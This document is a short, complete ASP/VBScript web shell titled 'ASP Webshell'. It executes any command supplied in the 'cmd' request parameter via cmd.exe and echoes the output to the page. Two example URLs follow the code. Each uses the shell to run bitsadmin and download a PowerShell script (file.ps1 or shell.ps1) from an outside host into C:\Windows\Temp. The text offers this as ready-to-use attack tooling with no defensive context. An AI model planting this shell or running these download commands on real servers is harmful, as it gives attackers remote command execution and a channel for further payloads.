<%@ Language=VBScript %>
<html>
<head><title>ASP Webshell</title></head>
<body>
<%
Dim command, shell, exec, output

command = Request("cmd")

If command <> "" Then
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd.exe /c " & command)
    output = exec.StdOut.ReadAll()
    Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
End If
%>

<form method="GET">
    <input type="text" name="cmd" style="width: 80%;" />
    <input type="submit" value="Execute" />
</form>
</body>
</html>
http://<your-server>/webshell.asp?cmd=bitsadmin /transfer myJob /priority foreground http://your-ip/file.ps1 C:\Windows\Temp\file.ps1
http://<server>/webshell.asp?cmd=bitsadmin%20/transfer%20myJob%20/priority%20foreground%20http://192.168.1.100/shell.ps1%20C:\Windows\Temp\shell.ps1
